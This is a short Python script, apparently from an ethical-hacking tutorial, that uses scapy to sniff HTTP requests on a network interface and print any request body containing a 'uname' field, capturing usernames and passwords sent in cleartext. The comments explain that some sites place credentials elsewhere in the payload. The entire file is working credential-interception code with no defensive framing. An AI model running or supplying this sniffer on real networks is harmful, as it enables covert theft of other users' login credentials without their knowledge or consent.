#in some other websites it may not send uname and pass in load field
#instead load may contain other stuffs which is not useful to us
#check if username is there in load or not if yes print else dont print anything

from scapy.all import sniff, Raw
from scapy.layers import http

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest) and packet.haslayer(Raw):
        load = packet[Raw].load                     
        if b"uname" in load:                        
            print(load)                             

def start(interface="eth0"):
    sniff(iface=interface, store=False, prn=process_sniffed_packet)

if __name__ == "__main__":
    start("eth0")